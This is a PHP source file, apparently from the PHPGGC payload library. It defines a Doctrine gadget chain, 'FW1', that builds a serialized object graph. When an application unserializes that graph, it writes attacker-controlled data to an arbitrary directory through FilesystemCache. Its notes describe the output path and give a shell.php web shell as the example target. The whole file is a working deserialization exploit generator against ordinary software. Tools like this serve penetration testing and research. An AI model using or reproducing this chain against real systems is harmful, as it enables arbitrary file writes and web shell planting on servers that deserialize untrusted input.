<?php

namespace GadgetChain\Doctrine;

use \Doctrine\ORM\EntityManager;
use \Doctrine\ORM\Configuration;
use \Doctrine\ORM\Mapping\ClassMetadataFactory;
use \Doctrine\ORM\Query\ResultSetMappingBuilder;
use \Doctrine\Common\Cache\FilesystemCache;
use \Doctrine\Common\Annotations\CachedReader;
use \Doctrine\ORM\Mapping\Driver\AnnotationDriver;


class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
	public $version = '?';
	public $vector = '__toString';
	public $author = 'cf';
	public $informations = 
		'We do not have full control of the path. If you enter /var/www/toto/shell.php as the remote_path, ' . "\n" .
		'it will be converted to /var/www/toto/e3/5b737464436c61737324434c4153534d455441444154415d5b315d/shell.php.' . "\n" .
		'Only the extension and base path are kept.';

	public function pre_process(array $parameters)
	{
		$parameters = parent::pre_process($parameters);
		# Sadly we cannot control the full path
		# We only have control over the base directory, and the extension
		$path = $parameters['remote_path'];
		$infos = (object) pathinfo($path);
		$parameters['extension'] = '.' . $infos->extension;
		$parameters['directory'] = $infos->dirname;
		$parameters['path'] = $infos->dirname . '/e3/5b737464436c61737324434c4153534d455441444154415d5b315d' . $infos->extension;
		return $parameters;
	}

	public function generate(array $parameters)
	{
		$c = new Configuration([

		]);
		$table = (object) [
			'name' => $parameters['data'],
			'schema' => '',
			'indexes' => null,
			'uniqueConstraints' => null,
			'options' => null
		];
		$em0 = new EntityManager(null, $c);
		$d0 = new AnnotationDriver(new CachedReader([
	    	'stdClass' => 
	    	[
	    		'Doctrine\ORM\Mapping\Embeddable' => true,
	    		'Doctrine\ORM\Mapping\Table' => $table
	    	]
	    ]));
	    $fc = new FilesystemCache($parameters['directory'], $parameters['extension']);
		$mf = new ClassMetadataFactory($fc, $em0, $d0);
		$em = new EntityManager($mf, null);
		$writer = new ResultSetMappingBuilder($em);

		return $writer;
	}
}
